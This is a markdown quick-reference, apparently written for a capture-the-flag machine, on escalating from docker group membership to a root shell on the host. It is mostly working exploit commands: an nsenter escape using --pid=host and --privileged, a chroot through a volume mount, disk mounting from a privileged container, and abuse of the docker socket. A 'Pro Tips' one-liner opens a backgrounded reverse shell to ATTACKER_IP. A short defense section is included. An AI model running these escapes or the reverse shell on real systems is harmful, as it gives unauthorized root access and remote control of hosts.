# 🚀 Docker Privilege Escalation - Quick Reference

## 📋 The Attack in 30 Seconds

```bash
# Check you're in docker group
groups  # Should show 'docker'

# ONE COMMAND TO RULE THEM ALL:
docker run --rm -it --pid=host --privileged alpine \
  nsenter --target 1 --mount --uts --ipc --net /bin/sh

# You're now root! 👑
cat /root/flag3.txt
```

---

## 🧠 Understanding the Magic

### What Each Part Does:

```
docker run                    → Create and run container
--rm                          → Delete container after exit
-it                           → Interactive terminal
--pid=host                    → 🔑 KEY: Share host's PID namespace
--privileged                  → 🔑 KEY: Grant ALL capabilities
alpine                        → Lightweight image (has nsenter tool)
nsenter                       → Tool to enter another process's namespaces
  --target 1                  → Target PID 1 (host's init/systemd)
  --mount --uts --ipc --net   → Enter these namespaces
  /bin/sh                     → Give me a shell
```

### Why It Works:

1. **Docker Group** = Can run containers = Effectively root
2. **--pid=host** = Container sees ALL host processes (breaks isolation)
3. **--privileged** = Grants ALL capabilities (bypasses restrictions)
4. **nsenter** = "Jump" from container namespace into host namespace
5. **Result** = Root shell on host! 🎉

---

## 🎯 Step-by-Step Exploitation

### Step 1: Verify Docker Access
```bash
id
# uid=1000(abu) gid=1000(abu) groups=1000(abu),999(docker)

docker ps
# Should work without errors
```

### Step 2: Test Basic Container
```bash
docker run --rm alpine echo "It works!"
```

### Step 3: Execute Privilege Escalation
```bash
docker run --rm -it --pid=host --privileged alpine \
  nsenter --target 1 --mount --uts --ipc --net /bin/sh
```

### Step 4: Verify Root Access
```bash
whoami  # root
hostname  # mobydock (host's hostname!)
ls /root  # Can see host's /root directory
cat /root/flag3.txt  # Get the flag!
```

---

## 🛠️ Alternative Methods

### Easy Mode: Volume Mount
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

### Medium Mode: Privileged Container
```bash
docker run --privileged --rm -it alpine
mkdir /h && mount /dev/sda1 /h && chroot /h
```

### Hard Mode: Socket + Nested
```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock --rm -it docker
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

---

## 🔬 Learning & Research

### Key Concepts to Understand:
- Linux Namespaces (PID, Mount, Network, UTS, IPC)
- Linux Capabilities (especially CAP_SYS_ADMIN)
- nsenter tool
- Container isolation mechanisms

### Commands to Explore:
```bash
# See your current namespaces
ls -la /proc/$$/ns/

# List all namespaces on system
lsns

# See PID 1's namespaces
ls -la /proc/1/ns/

# From container with --pid=host, see all host processes
docker run --pid=host alpine ps aux
```

---

## 🐛 Troubleshooting

### Error: "Cannot connect to Docker daemon"
```bash
# Check Docker is running
systemctl status docker

# Check you're in docker group
groups

# If just added to group, re-login
exit
# SSH back in
```

### Error: "Permission denied"
```bash
# Verify docker socket permissions
ls -la /var/run/docker.sock

# Should be: srw-rw---- 1 root docker

# Re-login to apply group changes
```

### Container exits immediately
```bash
# Make sure to use -it flags
docker run --rm -it alpine /bin/sh

# Not just:
docker run alpine /bin/sh  # ❌ Exits immediately
```

---

## 🎓 Why This Matters in Real World

### Common Misconfiguration:
Many companies add developers to the `docker` group for convenience.

**This is equivalent to giving them root!**

### Real-World Scenarios:
- CI/CD systems with Docker access
- Development environments
- Container orchestration platforms
- Any system where users can run `docker` commands

### Defense:
1. **Never** add regular users to docker group
2. Use **rootless Docker** instead
3. Implement Docker authorization plugins
4. Monitor for dangerous flags: `--privileged`, `--pid=host`, `--cap-add`
5. Use AppArmor/SELinux profiles

---

## 📚 Further Reading

- [Understanding Linux Namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html)
- [nsenter man page](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Container Escape Techniques](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

---

## ✨ Pro Tips

### One-Liner Variations:
```bash
# Shortest version
docker run --rm -it --pid=host --privileged alpine nsenter -t 1 -m -u -n -i sh

# With bash (if available in image)
docker run --rm -it --pid=host --cap-add=SYS_ADMIN ubuntu \
  nsenter --target 1 --mount --uts --ipc --net bash

# Silent background + reverse shell
docker run --rm -d --pid=host --cap-add=SYS_ADMIN alpine \
  nsenter --target 1 -m -u -i -n sh -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

### For CTFs:
1. Always check `id` and `groups` first
2. Look for `docker` group membership
3. This technique works on most Linux systems
4. Faster than compiling exploits!

---

**Remember**: Docker group = root. Handle with care! 🔐
